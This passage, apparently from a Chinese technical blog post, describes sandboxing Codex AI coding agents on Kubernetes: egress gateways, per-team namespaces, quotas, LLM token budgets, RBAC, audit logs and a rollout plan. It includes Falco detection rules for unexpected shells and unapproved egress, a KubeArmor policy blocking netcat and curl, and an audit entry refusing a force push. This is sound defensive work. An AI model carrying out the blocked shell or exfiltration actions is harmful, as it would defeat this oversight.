class="attr">selectors:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">podSelector:</span></span><br><span class="line">      <span class="attr">matchLabels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">codex-runner</span></span><br><span class="line">  <span class="attr">egressGateway:</span></span><br><span class="line">    <span class="attr">nodeSelector:</span></span><br><span class="line">      <span class="attr">matchLabels:</span></span><br><span class="line">        <span class="attr">node-role:</span> <span class="string">egress-gateway</span></span><br><span class="line">    <span class="attr">egressIP:</span> <span class="string">&quot;10.20.30.40&quot;</span>     <span class="comment"># 所有 codex pod 出公网都从这个 IP 出</span></span><br><span class="line">  <span class="attr">destinationCIDRs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;0.0.0.0/0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>效果：你的网络管理员只用在防火墙上盯一个 IP 就能监管所有 AI 出网行为。</p>
+<hr>
+<h2 id="5-多租户与配额：让-300-个工程师互不干扰"><a href="#5-多租户与配额：让-300-个工程师互不干扰" class="headerlink" title="5. 多租户与配额：让 300 个工程师互不干扰"></a>5. 多租户与配额：让 300 个工程师互不干扰</h2><h3 id="5-1-Namespace-切分策略"><a href="#5-1-Namespace-切分策略" class="headerlink" title="5.1 Namespace 切分策略"></a>5.1 Namespace 切分策略</h3><p>K8s 的隔离基本单位是 <strong>namespace</strong>。给多租户切 namespace 有三种典型策略：</p>
+<table>
+<thead>
+<tr>
+<th>策略</th>
+<th>适用</th>
+<th>优缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Per-team</strong></td>
+<td>团队规模 5-20 人</td>
+<td>中等粒度，运维负担可接受。推荐起步选这个</td>
+</tr>
+<tr>
+<td><strong>Per-user</strong></td>
+<td>高敏感场景（金融、医疗）</td>
+<td>隔离最强，但 namespace 数量爆炸（300 个工程师 = 300 个 ns），运维爆炸</td>
+</tr>
+<tr>
+<td><strong>Per-project</strong></td>
+<td>项目制公司、外包</td>
+<td>适合临时 / 短期项目，自然到期清理</td>
+</tr>
+</tbody></table>
+<p><strong>实战经验</strong>：刚起步用 Per-team，按 GitLab group 一比一映射 namespace。等用户上来再考虑细化。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-team-payments</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">pod-security.kubernetes.io/enforce:</span> <span class="string">restricted</span></span><br><span class="line">    <span class="attr">team:</span> <span class="string">payments</span></span><br><span class="line">    <span class="attr">cost-center:</span> <span class="string">&quot;CC-7842&quot;</span>        <span class="comment"># 用于计费分摊</span></span><br><span class="line">    <span class="attr">codex-tier:</span> <span class="string">production</span>         <span class="comment"># 用于策略匹配</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-ResourceQuota-LimitRange：硬资源天花板"><a href="#5-2-ResourceQuota-LimitRange：硬资源天花板" class="headerlink" title="5.2 ResourceQuota + LimitRange：硬资源天花板"></a>5.2 ResourceQuota + LimitRange：硬资源天花板</h3><p><strong>ResourceQuota</strong> 给整个 namespace 设资源上限：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ResourceQuota</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">team-payments-quota</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">codex-team-payments</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">hard:</span></span><br><span class="line">    <span class="attr">requests.cpu:</span> <span class="string">&quot;20&quot;</span></span><br><span class="line">    <span class="attr">requests.memory:</span> <span class="string">40Gi</span></span><br><span class="line">    <span class="attr">limits.cpu:</span> <span class="string">&quot;40&quot;</span></span><br><span class="line">    <span class="attr">limits.memory:</span> <span class="string">80Gi</span></span><br><span class="line">    <span class="attr">persistentvolumeclaims:</span> <span class="string">&quot;10&quot;</span></span><br><span class="line">    <span class="attr">pods:</span> <span class="string">&quot;50&quot;</span>                    <span class="comment"># 同时运行的 sandbox pod 不超过 50</span></span><br><span class="line">    <span class="attr">count/jobs.batch:</span> <span class="string">&quot;100&quot;</span>       <span class="comment"># 排队的 job 不超过 100</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>LimitRange</strong> 给单个 pod 设默认值（防止某个用户写了 pod 不带 resource 直接吃满）：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">LimitRange</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">team-payments-limits</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">codex-team-payments</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">limits:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">Container</span></span><br><span class="line">    <span class="attr">default:</span></span><br><span class="line">      <span class="attr">cpu:</span> <span class="string">&quot;500m&quot;</span></span><br><span class="line">      <span class="attr">memory:</span> <span class="string">1Gi</span></span><br><span class="line">    <span class="attr">defaultRequest:</span></span><br><span class="line">      <span class="attr">cpu:</span> <span class="string">&quot;100m&quot;</span></span><br><span class="line">      <span class="attr">memory:</span> <span class="string">256Mi</span></span><br><span class="line">    <span class="attr">max:</span></span><br><span class="line">      <span class="attr">cpu:</span> <span class="string">&quot;4&quot;</span></span><br><span class="line">      <span class="attr">memory:</span> <span class="string">8Gi</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-LLM-Token-配额：钱也得管"><a href="#5-3-LLM-Token-配额：钱也得管" class="headerlink" title="5.3 LLM Token 配额：钱也得管"></a>5.3 LLM Token 配额：钱也得管</h3><p>CPU 内存配好了，<strong>钱</strong>还没管。AI agent 一次会话动辄百万 token，按 GPT-4o 输入价约 $2.5/M（截至 2026-05）计算，一个工程师疯狂用 8 小时能消耗几十美元。300 个工程师不控制能直接亏穿预算。</p>
+<p>K8s 没有原生的”LLM token 配额”概念，需要自己加一层。常见做法：</p>
+<p><strong>方案 A：业务 LLM Gateway 上配额</strong>。Gateway 维护一个 (namespace, day) → tokens 的计数器。每次 AI 请求过来时检查并扣减。预算用完返回 429。简单但需要 LLM Gateway 自己实现。</p>
+<p><strong>方案 B：Kyverno mutation 注入预算 header</strong>。K8s admission 阶段给每个 codex pod 注入一个 header <code>X-Token-Budget: &lt;namespace 当日剩余预算&gt;</code>，业务 Gateway 看 header 限流。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">inject-token-budget</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">add-budget-env</span></span><br><span class="line">    <span class="attr">match:</span></span><br><span class="line">      <span class="attr">any:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span> [<span class="string">&quot;Pod&quot;</span>]</span><br><span class="line">          <span class="attr">namespaces:</span> [<span class="string">&quot;codex-*&quot;</span>]</span><br><span class="line">    <span class="attr">mutate:</span></span><br><span class="line">      <span class="attr">patchStrategicMerge:</span></span><br><span class="line">        <span class="attr">spec:</span></span><br><span class="line">          <span class="attr">containers:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">(name):</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">            <span class="attr">env:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">TOKEN_BUDGET_NAMESPACE</span></span><br><span class="line">              <span class="attr">value:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; request.namespace &#125;&#125;</span>&quot;</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">TOKEN_BUDGET_DAILY_USD</span></span><br><span class="line">              <span class="attr">value:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; namespace.metadata.annotations.\&quot;codex.io/daily-budget-usd\&quot; || `100` &#125;&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>方案 C：自研 Operator</strong>。用一个 controller 监听 LLM Gateway 的 metrics（OTel / Prometheus），按 namespace 聚合，达阈值时 patch namespace 的 ResourceQuota 把 pods 数量调到 0，新 pod 起不来。</p>
+<p>实战上 <strong>方案 A + 方案 B 组合</strong>最稳：Gateway 是兜底，K8s mutation 让客户端能提前知道预算（避免无谓发请求）。</p>
+<h3 id="5-4-RBAC：用户只能看自己的命"><a href="#5-4-RBAC：用户只能看自己的命" class="headerlink" title="5.4 RBAC：用户只能看自己的命"></a>5.4 RBAC：用户只能看自己的命</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-team-member</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">codex-team-payments</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>, <span class="string">&quot;pods/log&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;watch&quot;</span>]    <span class="comment"># 只能看，不能创建</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;codex.company.io&quot;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;agentsessions&quot;</span>]       <span class="comment"># 用 CRD 抽象用户操作</span></span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;list&quot;</span>, <span class="string">&quot;create&quot;</span>, <span class="string">&quot;delete&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键设计</strong>：用户<strong>不直接 kubectl</strong>，而是通过 CRD（如 <code>AgentSession</code>）操作。这样用户接口只有几个 CRD 的 schema，下游真正的 pod / job / configmap 由 controller 创建。这一层抽象既限制了用户能干什么，也让用户体验大幅简化。</p>
+<hr>
+<h2 id="6-可观测与审计：出事了能查清楚"><a href="#6-可观测与审计：出事了能查清楚" class="headerlink" title="6. 可观测与审计：出事了能查清楚"></a>6. 可观测与审计：出事了能查清楚</h2><p>四道关都过了，AI 跑起来了。但生产环境的核心问题是：<strong>出事了你能查清楚谁在什么时候干了什么吗？</strong></p>
+<p>K8s 的可观测分三层：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>数据源</th>
+<th>解决的问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>运行时安全</strong></td>
+<td>Falco / KubeArmor</td>
+<td>实时检测 sandbox 内的可疑行为</td>
+</tr>
+<tr>
+<td><strong>审计日志</strong></td>
+<td>K8s audit log + Codex execpolicy log</td>
+<td>复盘”谁让 AI 干了 X”</td>
+</tr>
+<tr>
+<td><strong>指标 + 追踪</strong></td>
+<td>Prometheus / OTel / Tempo</td>
+<td>性能、成本、SLA</td>
+</tr>
+</tbody></table>
+<h3 id="6-1-Falco：syscall-级实时检测"><a href="#6-1-Falco：syscall-级实时检测" class="headerlink" title="6.1 Falco：syscall 级实时检测"></a>6.1 Falco：syscall 级实时检测</h3><p><strong>Falco</strong>（最初由 Sysdig 开源，2024 年从 CNCF Incubating 毕业，syscall 级 runtime threat detection）通过 eBPF 钩子监听内核 syscall，按规则匹配出可疑行为告警。它是<strong>只看不拦</strong>，但告警快、规则灵活。</p>
+<p>针对 Codex sandbox 写一条规则：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">Codex</span> <span class="string">pod</span> <span class="string">spawns</span> <span class="string">unexpected</span> <span class="string">shell</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">检测</span> <span class="string">codex</span> <span class="string">sandbox</span> <span class="string">启动了不该启动的</span> <span class="string">shell</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">&gt;</span></span><br><span class="line">    <span class="string">container.image.repository</span> <span class="string">startswith</span> <span class="string">&quot;registry.company.internal/codex/&quot;</span> <span class="string">and</span></span><br><span class="line">    <span class="string">proc.name</span> <span class="string">in</span> <span class="string">(sh,</span> <span class="string">bash,</span> <span class="string">zsh,</span> <span class="string">ash,</span> <span class="string">dash)</span> <span class="string">and</span></span><br><span class="line">    <span class="string">not</span> <span class="string">proc.pname</span> <span class="string">in</span> <span class="string">(codex,</span> <span class="string">codex-tui,</span> <span class="string">codex-exec)</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">&gt;</span></span><br><span class="line">    <span class="string">Codex</span> <span class="string">pod</span> <span class="string">启动了未预期的</span> <span class="attr">shell:</span></span><br><span class="line">    <span class="string">pod=%k8s.pod.name</span> <span class="string">container=%container.name</span></span><br><span class="line">    <span class="string">proc=%proc.name</span> <span class="string">pproc=%proc.pname</span></span><br><span class="line">    <span class="string">cmdline=%proc.cmdline</span></span><br><span class="line">    <span class="string">user=%user.name</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">WARNING</span></span><br><span class="line">  <span class="attr">tags:</span> [<span class="string">codex</span>, <span class="string">container</span>, <span class="string">mitre_execution</span>]</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">rule:</span> <span class="string">Codex</span> <span class="string">pod</span> <span class="string">connects</span> <span class="string">to</span> <span class="string">non-allowed</span> <span class="string">IP</span></span><br><span class="line">  <span class="attr">desc:</span> <span class="string">codex</span> <span class="string">pod</span> <span class="string">出网到非白名单</span> <span class="string">IP</span></span><br><span class="line">  <span class="attr">condition:</span> <span class="string">&gt;</span></span><br><span class="line">    <span class="string">container.image.repository</span> <span class="string">startswith</span> <span class="string">&quot;registry.company.internal/codex/&quot;</span> <span class="string">and</span></span><br><span class="line">    <span class="string">fd.type=ipv4</span> <span class="string">and</span></span><br><span class="line">    <span class="string">not</span> <span class="string">fd.sip</span> <span class="string">in</span> <span class="string">(allowed_egress_ips)</span> <span class="string">and</span></span><br><span class="line">    <span class="string">evt.type</span> <span class="string">in</span> <span class="string">(connect,</span> <span class="string">sendto)</span></span><br><span class="line">  <span class="attr">output:</span> <span class="string">&gt;</span></span><br><span class="line">    <span class="string">Codex</span> <span class="string">pod</span> <span class="string">尝试连接非白名单地址:</span></span><br><span class="line">    <span class="string">pod=%k8s.pod.name</span> <span class="string">dest=%fd.sip:%fd.sport</span></span><br><span class="line">  <span class="attr">priority:</span> <span class="string">CRITICAL</span></span><br></pre></td></tr></table></figure>
+
+<p>Falco 告警接进 SLS / Loki / Sentry，安全团队按优先级响应。</p>
+<h3 id="6-2-KubeArmor：基于-LSM，主动拦截"><a href="#6-2-KubeArmor：基于-LSM，主动拦截" class="headerlink" title="6.2 KubeArmor：基于 LSM，主动拦截"></a>6.2 KubeArmor：基于 LSM，主动拦截</h3><p><strong>KubeArmor</strong>（AccuKnox 出品，CNCF Sandbox 项目）和 Falco 互补：基于 LSM（AppArmor/SELinux/BPF-LSM），可以<strong>主动拦截</strong>而不只是告警。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.kubearmor.com/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">KubeArmorPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">codex-block-dangerous-binaries</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">codex-runtime</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">codex-runner</span></span><br><span class="line">  <span class="attr">process:</span></span><br><span class="line">    <span class="attr">matchPaths:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/usr/bin/nc</span>        <span class="comment"># 禁止用 netcat</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/usr/bin/curl</span>      <span class="comment"># 禁止 curl（强制走 SDK）</span></span><br><span class="line">      <span class="attr">fromSource:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">path:</span> <span class="string">/workspace/</span>      <span class="comment"># 但工作目录里的脚本可以</span></span><br><span class="line">    <span class="attr">severity:</span> <span class="number">8</span></span><br><span class="line">    <span class="attr">action:</span> <span class="string">Block</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>实战策略</strong>：Falco 用于覆盖广、灵活的告警；KubeArmor 用于少数你<strong>确定要拦死</strong>的场景。两者都开。</p>
+<h3 id="6-3-全链路审计：从用户请求到-syscall"><a href="#6-3-全链路审计：从用户请求到-syscall" class="headerlink" title="6.3 全链路审计：从用户请求到 syscall"></a>6.3 全链路审计：从用户请求到 syscall</h3><p>最难的是把所有维度的日志串起来。一个典型的 Codex 请求生命周期：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">用户 (alice) 在 Web UI 提交 prompt</span><br><span class="line">        │</span><br><span class="line">        ▼ HTTP 请求带 X-Trace-Id: abc123</span><br><span class="line">API Gateway (鉴权 + 限流)</span><br><span class="line">        │</span><br><span class="line">        ▼ 创建 AgentSession CRD</span><br><span class="line">Codex Operator</span><br><span class="line">        │</span><br><span class="line">        ▼ 准入策略评估 (OPA &#x2F; Kyverno)</span><br><span class="line">        │</span><br><span class="line">        ▼ 创建 Sandbox Pod</span><br><span class="line">gVisor + restricted Pod</span><br><span class="line">        │</span><br><span class="line">        ▼ AI 决定执行命令</span><br><span class="line">execpolicy 检查</span><br><span class="line">        │</span><br><span class="line">        ▼ pod 内 syscall</span><br><span class="line">Falco &#x2F; KubeArmor 监听</span><br><span class="line">        │</span><br><span class="line">        ▼ 调 LLM Gateway</span><br><span class="line">        ▼ 调内部 GitLab MCP</span><br><span class="line">        ▼ 写工作区 PVC</span><br></pre></td></tr></table></figure>
+
+<p>每一步都打 log，<strong>统一通过 OpenTelemetry</strong>（CNCF 毕业的可观测协议，把 metrics/logs/traces 统一）带上 <code>traceId</code>，送到统一的存储（SLS / Loki + Tempo）。出事时按 traceId 一搜，从用户点击到 syscall 全链路时间线立刻可见。</p>
+<p>最关键的是 <strong>Codex execpolicy 决策</strong>也要进 audit log。每次 AI 想跑命令时记录：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="string">&quot;2026-05-09T11:46:23Z&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;traceId&quot;</span>: <span class="string">&quot;abc123&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;alice@company.com&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;namespace&quot;</span>: <span class="string">&quot;codex-team-payments&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;session&quot;</span>: <span class="string">&quot;sess-xyz&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;command&quot;</span>: [<span class="string">&quot;git&quot;</span>, <span class="string">&quot;push&quot;</span>, <span class="string">&quot;--force&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;decision&quot;</span>: <span class="string">&quot;forbidden&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;matched_rule&quot;</span>: <span class="string">&quot;destructive-git-ops&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;justification&quot;</span>: <span class="string">&quot;强制 push 会覆盖远程历史，使用 --force-with-lease 替代&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;model&quot;</span>: <span class="string">&quot;claude-sonnet-4-6&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;tokens_input&quot;</span>: <span class="number">12453</span>,</span><br><span class="line">  <span class="attr">&quot;tokens_output&quot;</span>: <span class="number">287</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这条记录就是合规审计的金标准——谁、什么时候、想干什么、被允许还是被拒、用了多少 token。</p>
+<hr>
+<h2 id="7-完整生产架构：把所有东西放进一张图"><a href="#7-完整生产架构：把所有东西放进一张图" class="headerlink" title="7. 完整生产架构：把所有东西放进一张图"></a>7. 完整生产架构：把所有东西放进一张图</h2><p>把上面所有组件放在一起，得到一个完整的 Codex 企业级 K8s 架构：</p>
+<p><img src="illustrations/F7-%E5%AE%8C%E6%95%B4%E7%94%9F%E4%BA%A7%E6%9E%B6%E6%9E%84%E6%80%BB%E5%9B%BE.webp" alt="Codex 企业级 K8s 生产架构总图：用户 → 准入 → Sandbox Pod → 服务集成 → 可观测"></p>
+<p>各层职责回顾：</p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>组件</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户层</strong></td>
+<td>Web UI / VS Code 插件 / CLI</td>
+<td>用户接入，统一 SSO</td>
+</tr>
+<tr>
+<td><strong>接入层</strong></td>
+<td>API Gateway（Nginx / Envoy） + OAuth/OIDC</td>
+<td>鉴权、限流、HTTPS 终止</td>
+</tr>
+<tr>
+<td><strong>控制平面</strong></td>
+<td>Codex Operator（CRD: AgentSession）</td>
+<td>把用户操作翻译成 K8s 资源</td>
+</tr>
+<tr>
+<td><strong>准入层</strong></td>
+<td>OPA Gatekeeper / Kyverno</td>
+<td>策略评估，等价于 execpolicy</td>
+</tr>
+<tr>
+<td><strong>运行时层</strong></td>
+<td>Sandbox Pod（gVisor + restricted PSS + seccomp）</td>
+<td>隔离 AI 执行</td>
+</tr>
+<tr>
+<td><strong>存储层</strong></td>
+<td>PVC（工作区） + Secret（API key） + ConfigMap</td>
+<td>持久化</td>
+</tr>
+<tr>
+<td><strong>网络层</strong></td>
+<td>Cilium NetworkPolicy + Egress Gateway</td>
+<td>进出流量控制</td>
+</tr>
+<tr>
+<td><strong>服务集成层</strong></td>
+<td>LLM Gateway / GitLab MCP / Jira MCP / Confluence MCP</td>
+<td>AI 能调用的内部服务</td>
+</tr>
+<tr>
+<td><strong>可观测层</strong></td>
+<td>Falco + KubeArmor + Prometheus + OTel</td>
+<td>实时监控 + 审计</td>
+</tr>
+<tr>
+<td><strong>审计层</strong></td>
+<td>SLS / Loki + Grafana + 安全 SIEM</td>
+<td>长期存档 + 复盘</td>
+</tr>
+</tbody></table>
+<p><strong>注意几个非显而易见的设计选择</strong>：</p>
+<ul>
+<li><strong>Operator 而非直接 kubectl</strong>：用户接口是 <code>AgentSession</code> CRD，所有 K8s 复杂性藏在 controller 后面。这让你能在不改前端的情况下迭代后端实现。</li>
+<li><strong>MCP 化所有内部服务</strong>：GitLab、Jira、Confluence 都封装成 MCP server，AI 通过统一协议访问，权限隔离在 MCP server 层做。</li>
+<li><strong>Egress Gateway 是合规审计的锚点</strong>：不管多少 codex pod，所有出公网流量都从一个 IP 出，安全团队监管的复杂度恒定。</li>
+</ul>
+<hr>
+<h2 id="8-从-MVP-到生产：4-阶段落地路线"><a href="#8-从-MVP-到生产：4-阶段落地路线" class="headerlink" title="8. 从 MVP 到生产：4 阶段落地路线"></a>8. 从 MVP 到生产：4 阶段落地路线</h2><p>不要一步到位。按 4 阶段逐步推进，每阶段都有清晰的可交付物。</p>
+<p><img src="illustrations/F8-4%E9%98%B6%E6%AE%B5%E6%BC%94%E8%BF%9B%E8%B7%AF%E7%BA%BF.webp" alt="从 MVP 到规模化的 4 阶段演进路线图"></p>
+<h3 id="Phase-1-MVP（1-2-周）"><a href="#Phase-1-MVP（1-2-周）" class="headerlink" title="Phase 1: MVP（1-2 周）"></a>Phase 1: MVP（1-2 周）</h3><p><strong>目标</strong>：让 5-10 个早期用户能跑起来，证明价值。</p>
+<ul>
+<li>✅ K8s 上跑 Codex pod，单 namespace，默认 runc</li>
+<li>✅ 用现成 Kyverno 策略模板（强制 readOnlyRootFilesystem、runAsNonRoot）</li>
+<li>✅ 接公司 LLM Gateway（最便宜的模型先用着）</li>
+<li>✅ 一个简单 Web UI（哪怕是 Streamlit）</li>
+<li>✅ K8s audit log 写到现有日志系统</li>
+</ul>
+<p><strong>不做</strong>：gVisor、Falco、多租户、完整 OPA 策略链、CRD/Operator。</p>
+<p><strong>判断标准</strong>：5 个用户用一周，反馈”能干活，比 ChatGPT Web 顺手”。</p>
+<h3 id="Phase-2-Beta（1-2-个月）"><a href="#Phase-2-Beta（1-2-个月）" class="headerlink" title="Phase 2: Beta（1-2 个月）"></a>Phase 2: Beta（1-2 个月）</h3><p><strong>目标</strong>：扩到 50 用户，引入正经的安全机制。</p>
+<ul>
+<li>启用 gVisor RuntimeClass，sandbox pod 默认走 gVisor</li>
+<li>加 Cilium，启用 NetworkPolicy 默认 deny</li>
+<li>部署 Falco，写 5-10 条 codex 专用规则</li>
+<li>引入 Kyverno 完整策略链（镜像白名单、资源 quota、tag 强制）</li>
+<li>接 GitLab MCP（让 AI 能查代码、提 MR）</li>
+<li>加成本看板（按 namespace 统计 token 消耗）</li>
+</ul>
+<p><strong>判断标准</strong>：50 用户、零安全事故、月成本符合预期。</p>
